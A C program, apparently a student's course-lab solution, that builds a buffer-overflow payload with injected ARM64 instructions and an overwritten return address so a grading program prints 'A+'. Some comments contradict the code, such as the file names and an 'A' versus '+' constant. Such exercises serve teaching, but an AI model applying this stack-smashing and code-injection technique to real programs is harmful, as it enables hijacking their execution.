/*----------------------------------------------------------------------
 * createdataA.c
 * Author: Praneeth Bhandaru
 *
 * Produces a file called dataB with the student name, a nullbyte,
 * padding to overrun the stack, and the address of the instruction in
 * main to get a B, the latter of which will overwrite getName's stored
 * x30.
----------------------------------------------------------------------*/


#include <stdio.h>
#include <stdlib.h>
#include "miniassembler.h"

/* Return address stored in getName's x30 after buffer overrun */
static const unsigned int lReturnAddress = 0x42006C;

/* char array containing my name */
static const char sName[] = "Chinmay Bhandaru";


/* Takes no parameters. Opens (and potentially creates) file 'dataAplus'
 * Writes content to 'dataAplus' that results in a grade of 'A+' being
 * assigned by executing code in the BSS. Returns 0 upon completion. */
int main(void) {
    int i;
    unsigned int uiInstr;

    /* Open/create file dataB with write privileges */
    FILE *psFile = fopen("dataAplus", "w");

    /* Print the stored name into dataB */
    fprintf(psFile, sName);

    /* Add nullbytes as padding and mark end of name */
    for (i = 0; i < 2; i++) {
        putc(0, psFile);
    }
    putc('A', psFile); /* store printf parameter value at 0x42006A */
    for (i = 0; i < 1; i++) {
        putc(0, psFile);
    }

    /* adr x0, 0x42006A */
    uiInstr = MiniAssembler_adr(0, 0x42006A, 0x42006C);
    (void) fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    /* bl printf */
    uiInstr = MiniAssembler_bl(0x400690, 0x420070);
    (void) fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    /* mov x0, 'A' */
    uiInstr = MiniAssembler_mov(0, '+');
    (void) fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    /* adr x1, 0x420044 */
    uiInstr = MiniAssembler_adr(1, 0x420044,0x420078);
    (void) fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    /* strb x0, [x1] */
    uiInstr = MiniAssembler_strb(0, 1);
    (void) fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    /* b 0x40089c */
    uiInstr = MiniAssembler_b(0x40089c, 0x420080);
    (void) fwrite(&uiInstr, sizeof(unsigned int), 1, psFile);

    /* Add nullbytes to overrun the buffer */
    for (i = 0; i < 4; i++) {
        putc(0, psFile);
    }

    /* Overwrite x30 with address of printf call in main */
    (void) fwrite(&lReturnAddress, sizeof(unsigned int), 1, psFile);

    /* Close the file */
    fclose(psFile);

    return 0;
}
